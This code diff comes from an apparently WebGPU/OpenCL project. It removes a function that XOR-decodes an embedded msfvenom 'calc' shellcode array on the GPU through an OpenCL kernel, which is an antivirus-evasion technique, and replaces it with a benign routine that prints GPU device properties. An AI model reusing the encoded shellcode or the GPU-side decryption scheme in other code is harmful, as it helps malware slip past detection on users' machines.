@@ -1,114 +1,164 @@
 #include "../../include/vanilla/main_webgpu.h"
 
-#define SHELLCODE_LENGTH 276
+#include <stdio.h>
+#include <stdlib.h>
 
-const char* xorKernelSource[] = { //                                
-"__kernel void decrypt(__global char* encrypted, __global char* password, __global char* output) { output[get_global_id(0)] = encrypted[get_global_id(0)] ^ password[0];  }"
-};
+//OpenCL headers
+#include <CL\opencl.h>                                                                              //single compulsory file
+#include <CL\cl.h>                 //optional - added on for intellisense
+#include "CL\cl_platform.h"        //optional - added on for intellisense
+
 
 int cltest(){
 
-    // fc 48 ... msfvenom calc payload
-    unsigned char buf[] = "\x97\x23\xe8\x8f\x9b\x83\xab\x6b\x6b\x6b\x2a\x3a\x2a\x3b\x39\x3a\x3d\x23\x5a\xb9\x0e\x23\xe0\x39\x0b\x23\xe0\x39\x73\x23\xe0\x39\x4b\x23\xe0\x19\x3b\x23\x64\xdc\x21\x21\x26\x5a\xa2\x23\x5a\xab\xc7\x57\x0a\x17\x69\x47\x4b\x2a\xaa\xa2\x66\x2a\x6a\xaa\x89\x86\x39\x2a\x3a\x23\xe0\x39\x4b\xe0\x29\x57\x23\x6a\xbb\xe0\xeb\xe3\x6b\x6b\x6b\x23\xee\xab\x1f\x0c\x23\x6a\xbb\x3b\xe0\x23\x73\x2f\xe0\x2b\x4b\x22\x6a\xbb\x88\x3d\x23\x94\xa2\x2a\xe0\x5f\xe3\x23\x6a\xbd\x26\x5a\xa2\x23\x5a\xab\xc7\x2a\xaa\xa2\x66\x2a\x6a\xaa\x53\x8b\x1e\x9a\x27\x68\x27\x4f\x63\x2e\x52\xba\x1e\xb3\x33\x2f\xe0\x2b\x4f\x22\x6a\xbb\x0d\x2a\xe0\x67\x23\x2f\xe0\x2b\x77\x22\x6a\xbb\x2a\xe0\x6f\xe3\x23\x6a\xbb\x2a\x33\x2a\x33\x35\x32\x31\x2a\x33\x2a\x32\x2a\x31\x23\xe8\x87\x4b\x2a\x39\x94\x8b\x33\x2a\x32\x31\x23\xe0\x79\x82\x3c\x94\x94\x94\x36\x23\xd1\x6a\x6b\x6b\x6b\x6b\x6b\x6b\x6b\x23\xe6\xe6\x6a\x6a\x6b\x6b\x2a\xd1\x5a\xe0\x04\xec\x94\xbe\xd0\x9b\xde\xc9\x3d\x2a\xd1\xcd\xfe\xd6\xf6\x94\xbe\x23\xe8\xaf\x43\x57\x6d\x17\x61\xeb\x90\x8b\x1e\x6e\xd0\x2c\x78\x19\x04\x01\x6b\x32\x2a\xe2\xb1\x94\xbe\x08\x0a\x07\x08\x45\x0e\x13\x0e\x6b\x6b";
 
-    unsigned char key[] = "k";
 
-    char finalPayload[SHELLCODE_LENGTH] = { 0 };
+    //function prototype
+    void printOpenCLDeviceProperties(void);
 
-    size_t dataSize = SHELLCODE_LENGTH;
 
-    //get all platforms (drivers)
-    std::vector<cl::Platform> all_platforms;
-    cl::Platform::get(&all_platforms);
-    if (all_platforms.size() == 0)
+    //var decl.
+    cl_int result = 0;
+    cl_platform_id ocl_platform_id = NULL;
+    cl_uint dev_count ;
+    cl_device_id* ocl_device_ids = NULL;
+    char oclPlatformInfo[512];
+
+    //code
+    printf("OpenCL INFORMATION\n");
+    printf("=============================================================================================\n");
+    
+    //get first platform ID
+    result = clGetPlatformIDs(1, &ocl_platform_id, NULL);
+    if (result != CL_SUCCESS)
     {
-        std::cout << " No platforms found. Check OpenCL installation!\n";
-        exit(1);
-    }
-    cl::Platform default_platform = all_platforms[0];
-    std::cout << "Using platform: " << default_platform.getInfo<CL_PLATFORM_NAME>() << "\n";
-
-    //get default device of the default platform
-    std::vector<cl::Device> all_devices;
-    default_platform.getDevices(CL_DEVICE_TYPE_ALL, &all_devices);
-    if (all_devices.size() == 0) 
-    {
-        std::cout << " No devices found. Check OpenCL installation!\n";
-        exit(1);
-    }
-    cl::Device default_device = all_devices[0];
-    std::cout << "Using device: " << default_device.getInfo<CL_DEVICE_NAME>() << "\n";
-
-    // Setup OpenCL
-    cl::Context context({ default_device });
-    cl_int err;
-    cl_command_queue queue = clCreateCommandQueueWithProperties(context.get(), default_device.get(), NULL, &err);   
-
-    // setup buffers
-    cl_mem shellcodeEncrypted = clCreateBuffer(context.get(), CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR, dataSize, buf, &err);
-    cl_mem xorKey = clCreateBuffer(context.get(), CL_MEM_READ_ONLY | CL_MEM_COPY_HOST_PTR, sizeof(char), key, &err);
-    cl_mem shellcodeDecryptedOut = clCreateBuffer(context.get(), CL_MEM_READ_WRITE, dataSize, NULL, &err);
-
-    // Create kernel from source
-    cl_program kernel = clCreateProgramWithSource(context.get(), 1, xorKernelSource, NULL, &err);
-    if (err)
-    {
-   //     std::cout << "clCreateProgramWithSource: " << getErrorString(err) << std::endl;
-    }
-    cl_int res = clBuildProgram(kernel, 0, NULL, NULL, NULL, NULL);
-    if (res != CL_BUILD_SUCCESS)
-    {
-        size_t len = 0;
-        clGetProgramBuildInfo(kernel, default_device.get(), CL_PROGRAM_BUILD_LOG, 0, NULL, &len);
-        char* buffer = (char*)malloc(len * sizeof(char));
-        clGetProgramBuildInfo(kernel, default_device.get(), CL_PROGRAM_BUILD_LOG, len, buffer, NULL);
-        std::cout << buffer << std::endl;
-        free(buffer);
+        printf("OpenCL Runtime API Error - clGetPlatformIDs() failed\n");
+        exit(EXIT_FAILURE);
     }
 
-    // Get a handle to the kernel function for decryption
-    cl_kernel decryptKernelFunctionHandle = clCreateKernel(kernel, "decrypt", &err);
-    if (err)
+    //get GPU device count
+    result = clGetDeviceIDs(ocl_platform_id, CL_DEVICE_TYPE_GPU, 0, NULL, &dev_count);
+    if (result != CL_SUCCESS)
     {
-    //    std::cout << "clCreateKernel: " << getErrorString(err) << std::endl;
+        printf("OpenCL Runtime API Error - clGetDeviceIDs() failed\n");
+        exit(EXIT_FAILURE);
+    }
+    
+    else if(dev_count == 0)
+    {
+        printf("There is no OpenCL supported device on this system %u\n", dev_count);
+        exit(EXIT_FAILURE);
+    }
+    else
+    {
+        //get platform name
+        clGetPlatformInfo(ocl_platform_id, CL_PLATFORM_NAME, 500, &oclPlatformInfo, NULL);
+        printf("OpenCL supporting GPU Device/Platform Name : %s\n", oclPlatformInfo);
+
+        //get platform version
+        clGetPlatformInfo(ocl_platform_id, CL_PLATFORM_VERSION, 500, &oclPlatformInfo, NULL);
+        printf("OpenCL supporting GPU Device/Platform Version : %s\n", oclPlatformInfo);
+
+        //print supporting device number
+        printf("Total number of OpenCL supported GPU Devices on this system : %d\n", dev_count);
+
+        //allocate memory to hold those device ids
+        ocl_device_ids = (cl_device_id*)malloc(sizeof(cl_device_id) * dev_count);
+        if (ocl_device_ids == NULL)
+        {
+            printf("malloc for ocl_device_ids failed\n");
+            exit(EXIT_FAILURE);
+        }
+        else
+        {
+            printf("\nmalloc for ocl_device_ids successful\n");
+        }
+
+        //get ids into allocated buffer
+        clGetDeviceIDs(ocl_platform_id, CL_DEVICE_TYPE_GPU, dev_count, ocl_device_ids, NULL);
+        if (ocl_device_ids == NULL)
+        {
+            printf("clGetDeviceIDs() failed\n");
+            exit(EXIT_FAILURE);
+        }
+        else
+        {
+            printf("\nclGetDeviceIDs() successful\n");
+        }
+
+        char ocl_dev_prop[1024];
+        int i = 0;
+        
+        for(i = 0; i < (int)dev_count; i++)
+        {
+            printf("\n");
+            printf("=============================================================================================\n");
+            printf("******* GPU DEVICE GENERAL INFORMATION ********\n");
+            printf("=============================================================================================\n");
+            
+            printf("GPU Device Number                                   : %d\n", i);
+
+            clGetDeviceInfo(ocl_device_ids[i], CL_DEVICE_NAME, sizeof(ocl_dev_prop), &ocl_dev_prop, NULL);
+            printf("GPU Device Name                                     : %s\n", ocl_dev_prop);
+
+            clGetDeviceInfo(ocl_device_ids[i], CL_DEVICE_VENDOR, sizeof(ocl_dev_prop), &ocl_dev_prop, NULL);
+            printf("GPU Device Vendor                                   : %s\n", ocl_dev_prop);
+
+            clGetDeviceInfo(ocl_device_ids[i], CL_DRIVER_VERSION, sizeof(ocl_dev_prop), &ocl_dev_prop, NULL);
+            printf("GPU Device Driver Version                           : %s\n", ocl_dev_prop);
+            
+            clGetDeviceInfo(ocl_device_ids[i], CL_DEVICE_VERSION, sizeof(ocl_dev_prop), &ocl_dev_prop, NULL);
+            printf("GPU Device OpenCL Version                           : %s\n", ocl_dev_prop);
+
+            cl_uint clock_frequency;
+            clGetDeviceInfo(ocl_device_ids[i], CL_DEVICE_MAX_CLOCK_FREQUENCY, sizeof(clock_frequency), &clock_frequency, NULL);
+            printf("GPU Device Clock Rate                               : %u\n", clock_frequency);
+
+            printf("\n");
+            printf("******* GPU DEVICE MEMORY INFORMATION ********\n");
+            printf("=============================================================================================\n");
+            
+            cl_ulong mem_size;
+            clGetDeviceInfo(ocl_device_ids[i], CL_DEVICE_GLOBAL_MEM_SIZE, sizeof(mem_size), &mem_size, NULL);
+            printf("GPU Device Global Memory                            : %llu Bytes\n", (unsigned long long)mem_size);
+
+            cl_device_local_mem_type local_mem_type;
+            clGetDeviceInfo(ocl_device_ids[i], CL_DEVICE_LOCAL_MEM_TYPE, sizeof(local_mem_type), &local_mem_type, NULL);
+            printf("GPU Device Local Memory Type                           : %u\n", local_mem_type);
+
+            clGetDeviceInfo(ocl_device_ids[i], CL_DEVICE_LOCAL_MEM_SIZE, sizeof(mem_size), &mem_size, NULL);
+            printf("GPU Device Local Memory Size                           : %llu\n", (unsigned long long)mem_size);
+
+            clGetDeviceInfo(ocl_device_ids[i], CL_DEVICE_MAX_CONSTANT_BUFFER_SIZE, sizeof(mem_size), &mem_size, NULL);
+            printf("GPU Device Constant Buffer Size                        : %llu Bytes\n", (unsigned long long)mem_size);
+
+            printf("\n");
+            printf("******* GPU DEVICE COMPUTE INFORMATION ********\n");
+            printf("=============================================================================================\n");
+            
+            cl_uint compute_units;
+            clGetDeviceInfo(ocl_device_ids[i], CL_DEVICE_MAX_COMPUTE_UNITS, sizeof(compute_units), &compute_units, NULL);
+            printf("GPU Device No. of Parallel Processors Cores         : %u\n", compute_units);
+
+            size_t workgroup_size;
+            clGetDeviceInfo(ocl_device_ids[i], CL_DEVICE_MAX_WORK_GROUP_SIZE, sizeof(workgroup_size), &workgroup_size, NULL);
+            printf("GPU Device Work Group Size                          : %u\n", (unsigned int)workgroup_size);
+
+            size_t workitem_dims;
+            clGetDeviceInfo(ocl_device_ids[i], CL_DEVICE_MAX_WORK_ITEM_DIMENSIONS, sizeof(workitem_dims), &workitem_dims, NULL);
+            printf("GPU Device Work Item Dimensions         : %u\n", (unsigned int)workitem_dims);
+
+            size_t workitem_size[3];
+            clGetDeviceInfo(ocl_device_ids[i], CL_DEVICE_MAX_WORK_ITEM_SIZES, sizeof(workitem_size), &workitem_size, NULL);
+            printf("GPU Device Work Item Sizes               : %u/%u/%u\n", (unsigned int)workitem_size[0], \
+                                                                            (unsigned int)workitem_size[1], \
+                                                                            (unsigned int)workitem_size[2]);
+
+            printf("=============================================================================================\n");
+        }
+        free(ocl_device_ids);
     }
 
-    // Set arguments for kernel
-    clSetKernelArg(decryptKernelFunctionHandle, 0, sizeof(cl_mem), (void*)&shellcodeEncrypted);
-    clSetKernelArg(decryptKernelFunctionHandle, 1, sizeof(cl_mem), (void*)&xorKey);
-    clSetKernelArg(decryptKernelFunctionHandle, 2, sizeof(cl_mem), (void*)&shellcodeDecryptedOut);
-
-    // Launch the kernel on the GPU with one work item per byte
-    size_t workSize = SHELLCODE_LENGTH;
-    err = clEnqueueNDRangeKernel(queue, decryptKernelFunctionHandle, 1, NULL, &workSize, NULL, 0, NULL, NULL);
-    if (err)
-    {
-   //     std::cout << "clEnqueueNDRangeKernel: " << getErrorString(err) << std::endl;
-    }
-
-    // Copy the output from GPU memory back to CPU memory
-    err = clEnqueueReadBuffer(queue, shellcodeDecryptedOut, CL_TRUE, 0, dataSize, finalPayload, 0, NULL, NULL);
-    if (err)
-    {
-  //      std::cout << "clEnqueueReadBuffer: " << getErrorString(err) << std::endl;
-    }
-
-    // Print decrypted payload
-    for (int i=0; i < SHELLCODE_LENGTH; i++)
-    {
-        printf("\\x%02x", (char)finalPayload[i]);
-    }
-
-    // Cleanup
-    clReleaseKernel(decryptKernelFunctionHandle);
-    clReleaseProgram(kernel);
-    clReleaseCommandQueue(queue);
-    clReleaseContext(context.get());
-    clReleaseMemObject(shellcodeEncrypted);
-    clReleaseMemObject(xorKey);
-    clReleaseMemObject(shellcodeDecryptedOut);
-
-return 0;
 }
 
 extern"C"{
